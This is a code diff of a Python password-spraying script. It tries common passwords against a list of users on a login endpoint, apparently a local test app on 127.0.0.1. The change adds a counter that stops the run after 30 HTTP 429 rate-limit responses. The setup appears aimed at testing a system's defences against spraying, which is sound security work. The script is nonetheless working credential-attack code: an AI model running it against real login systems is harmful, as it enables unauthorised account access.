@@ -8,7 +8,7 @@ import requests
 from app import init_db
 
 LOGIN_URL = "http://127.0.0.1:5000/login"
-USERS = util.users_list()
+USERS = util.get_usernames_by_category()
 MAX_DURATION = 7200 #this is two hours 
 
 def run_server():
@@ -19,7 +19,7 @@ def password_spraying():
     with open("common_passwords.csv", newline="", encoding="utf-8") as f:
         reader = csv.reader(f)
         start = time.perf_counter()
-        
+        count = 0
         for row in reader:
                 password = row[0]
                 for user in USERS:
@@ -32,12 +32,19 @@ def password_spraying():
                                 "password": password
                             }
                         )
-                        success = "/dashboard" in response.url
+                        success, code_resp = "/dashboard" in response.url, response.status_code 
                         if success :
                             break
+                        if code_resp == 429:
+                        
+                            count+=1
+                            if count == 30:
+                                print("Attack has been blocked by the system")
+                                return 
+                            
                     else:
                         print(f"Time limit reached ({elapsed_time:.2f}s)Shutting down.")
-                        break
+                        return 
                     time.sleep(0.05) 
             
 
@@ -54,7 +61,7 @@ if __name__ == '__main__':
         try:
             # Run the attack script
             password_spraying()
-            print("In try except module")
+            
         except Exception as e:
             print(f"An error occurred during spraying: {e}")
         
